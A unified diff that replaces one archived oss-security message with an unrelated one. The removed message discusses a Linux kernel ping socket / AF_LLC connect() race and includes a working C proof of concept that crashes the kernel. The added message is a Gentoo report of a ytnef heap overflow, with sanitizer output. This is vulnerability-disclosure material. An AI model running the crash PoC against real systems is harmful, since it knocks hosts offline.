@@ -1,89 +1,103 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/03/24/7
-Message-ID: <CAAeHK+yrE7+BZztHVn-2jKgLqgzgbBEa4VWCO8SL45oD0nRxEw@mail.gmail.com>
-Date: Fri, 24 Mar 2017 21:43:30 +0100
-From: Andrey Konovalov <andreyknvl@...gle.com>
-To: oss-security@...ts.openwall.com, "David S. Miller" <davem@...emloft.net>,  Alexey Kuznetsov <kuznet@....inr.ac.ru>, James Morris <jmorris@...ei.org>,  Hideaki YOSHIFUJI <yoshfuji@...ux-ipv6.org>, Patrick McHardy <kaber@...sh.net>,  netdev <netdev@...r.kernel.org>, LKML <linux-kernel@...r.kernel.org>,  Eric Dumazet <edumazet@...gle.com>
-Cc: Vasily Kulikov <segoon@...nwall.com>
-Subject: Re: Linux kernel ping socket / AF_LLC connect() sin_family race
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/06/07/3
+Message-ID: <181022.281616123-sendEmail@localhost>
+Date: Wed, 7 Jun 2017 12:52:37 +0000
+From: "Agostino Sarubbo" <ago@...too.org>
+To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
+Subject: ytnef: heap-based buffer overflow in PrintTNEF (ytnefprint/main.c)
 Content-Type: text/plain; charset=utf-8
 
-On Fri, Mar 24, 2017 at 9:27 PM, Solar Designer <solar@...nwall.com> wrote:
-> Hi,
->
-> I haven't fully investigated this issue, and the Subject is provisional
-> (but will probably get stuck).  I am not yet sure which kernel
-> subsystem(s) to blame here (ping sockets? LLC sockets? other/more?), and
-> there might be other ways to trigger the issue.
+Not security relevant at all since the crash happens in the command line tool, but I'm sharing it as well.
 
-Reproduced the crash on current upstream
-(ebe64824e9de4b3ab3bd3928312b4b2bc57b4b7e).
+Description:
+ytnef is Yeraze’s TNEF Stream Reader – for winmail.dat files.
 
-Adding kernel maintainers.
+The complete ASan output of the issue:
 
->
-> Just off Twitter:
->
-> https://twitter.com/danieljiang0415/status/845116665184497664
->
-> daniel_jiang
-> @danieljiang0415
-> google won't fix kernel crash bug, I release the poc now.
-> https://github.com/danieljiang0415/android_kernel_crash_poc
->
-> And the PoC is:
->
-> ---
-> #include <stdio.h>
-> #include <sys/socket.h>
-> #include <arpa/inet.h>
-> #include <stdlib.h>
-> static int sockfd = 0;
-> static struct sockaddr_in addr = {0};
->
-> void fuzz(void * param){
->     while(1){
->         addr.sin_family = 0;//rand()%42;
->         printf("sin_family1 = %08lx\n", addr.sin_family);
->         connect(sockfd, (struct sockaddr *)&addr, 16);
->     }
-> }
-> int main(int argc, char **argv)
-> {
->     sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);
->     int thrd;
->     pthread_create(&thrd, NULL, fuzz, NULL);
->     while(1){
->         addr.sin_family = 0x1a;//rand()%42;
->         addr.sin_port = 0;
->         addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
->         connect(sockfd, (struct sockaddr *)&addr, 16);
->         addr.sin_family = 0;
->     }
->     return 0;
-> }
-> ---
->
-> I suppose the focus on Android is because it makes ping sockets
-> available to users by default, but the bug isn't Android-specific.
->
-> By granting ping sockets to a user, I am able to crash a RHEL7'ish
-> system with the above PoC quickly.  The crash (at least in my two tests)
-> is a NULL pointer dereference in net/ipv4/ping.c: ping_v4_unhash().
-> In newer upstream code, e.g. Linux 4.10.5, the function is renamed to
-> ping_unhash() since it's shared with IPv6, but is otherwise similar.
->
-> The two address families used by the PoC above are AF_UNSPEC and AF_LLC.
-> For the latter, net/llc/af_llc.c: llc_ui_connect() checks for AF_LLC and
-> then proceeds to overwrite parts of the "struct sockaddr".
-> llc_ui_bind() looks similar, so the issue might also be triggerable via
-> bind().  These overwrites might be directly related to the crash, or it
-> might be something further.  At first glance, these two functions look
-> similar in RHEL7 and 4.10.5, so, if relevant, can probably be used to
-> trigger the issue on latest upstream as well.
->
-> At this point, I think I'll leave further investigation to someone more
-> up-to-date on these interfaces and conventions.  I am merely conveying
-> the message, which at this point I understand only partially.
->
-> Alexander
+# ytnefprint $FILE
+==11928==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000001031 at pc 0x00000049df8d bp 0x7ffd1e1feb20 sp 0x7ffd1e1fe2d0
+READ of size 2 at 0x602000001031 thread T0
+    #0 0x49df8c in printf_common(void*, char const*, __va_list_tag*) /tmp/portage/sys-libs/compiler-rt-sanitizers-4.0.0/work/compiler-rt-4.0.0.src/lib/asan/../sanitizer_common/sanitizer_common_interceptors_format.inc:544
+    #1 0x49ea7a in __interceptor_vprintf /tmp/portage/sys-libs/compiler-rt-sanitizers-4.0.0/work/compiler-rt-4.0.0.src/lib/asan/../sanitizer_common/sanitizer_common_interceptors.inc:1388
+    #2 0x49eb37 in printf /tmp/portage/sys-libs/compiler-rt-sanitizers-4.0.0/work/compiler-rt-4.0.0.src/lib/asan/../sanitizer_common/sanitizer_common_interceptors.inc:1434
+    #3 0x509747 in PrintTNEF /tmp/ytnef-1.9.2/ytnefprint/main.c:195:7
+    #4 0x50882e in main /tmp/ytnef-1.9.2/ytnefprint/main.c:84:5
+    #5 0x7f16830da78f in __libc_start_main /tmp/portage/sys-libs/glibc-2.23-r3/work/glibc-2.23/csu/../csu/libc-start.c:289
+    #6 0x419c38 in _start (/usr/bin/ytnefprint+0x419c38)
+
+0x602000001031 is located 0 bytes to the right of 1-byte region [0x602000001030,0x602000001031)
+allocated by thread T0 here:
+    #0 0x4cf7e0 in calloc /tmp/portage/sys-libs/compiler-rt-sanitizers-4.0.0/work/compiler-rt-4.0.0.src/lib/asan/asan_malloc_linux.cc:74
+    #1 0x7f1683faf8bb in TNEFAttachmentFilename /tmp/ytnef-1.9.2/lib/ytnef.c:752:19
+    #2 0x7f1683fc5b47 in TNEFParse /tmp/ytnef-1.9.2/lib/ytnef.c:1184:15
+    #3 0x7f1683fc49d3 in TNEFParseFile /tmp/ytnef-1.9.2/lib/ytnef.c:1042:10
+    #4 0x508814 in main /tmp/ytnef-1.9.2/ytnefprint/main.c:80:9
+    #5 0x7f16830da78f in __libc_start_main /tmp/portage/sys-libs/glibc-2.23-r3/work/glibc-2.23/csu/../csu/libc-start.c:289
+
+SUMMARY: AddressSanitizer: heap-buffer-overflow /tmp/portage/sys-libs/compiler-rt-sanitizers-4.0.0/work/compiler-rt-4.0.0.src/lib/asan/../sanitizer_common/sanitizer_common_interceptors_format.inc:544 in 
+printf_common(void*, char const*, __va_list_tag*)
+Shadow bytes around the buggy address:
+  0x0c047fff81b0: fa fa 00 00 fa fa 04 fa fa fa 00 00 fa fa 00 fa
+  0x0c047fff81c0: fa fa 00 00 fa fa 00 fa fa fa 00 00 fa fa 04 fa
+  0x0c047fff81d0: fa fa 00 00 fa fa 00 05 fa fa 00 00 fa fa 00 00
+  0x0c047fff81e0: fa fa 05 fa fa fa 00 00 fa fa 00 05 fa fa 00 00
+  0x0c047fff81f0: fa fa 00 00 fa fa fd fd fa fa fd fd fa fa fd fd
+=>0x0c047fff8200: fa fa fd fa fa fa[01]fa fa fa 00 00 fa fa 04 fa
+  0x0c047fff8210: fa fa 00 00 fa fa 04 fa fa fa 00 00 fa fa 04 fa
+  0x0c047fff8220: fa fa 00 00 fa fa 04 fa fa fa 00 00 fa fa 00 fa
+  0x0c047fff8230: fa fa 00 00 fa fa 00 fa fa fa 00 00 fa fa 04 fa
+  0x0c047fff8240: fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 01 fa
+  0x0c047fff8250: fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa fd fd
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==11928==ABORTING
+Affected version:
+1.9.2
+
+Fixed version:
+N/A
+
+Commit fix:
+N/A
+
+Credit:
+This bug was discovered by Agostino Sarubbo of Gentoo.
+
+CVE:
+N/A
+
+Reproducer:
+https://github.com/asarubbo/poc/blob/master/00242-ytnef-heapoverflow-PrintTNEF
+
+Timeline:
+2017-03-27: bug discovered and reported to upstream
+2017-05-24: blog post about the issue
+
+Note:
+This bug was found with American Fuzzy Lop.
+
+Permalink:
+https://blogs.gentoo.org/ago/2017/05/24/ytnef-heap-based-buffer-overflow-in-printtnef-ytnefprintmain-c/
+
+--
+Agostino Sarubbo
+Gentoo Linux Developer
+
+
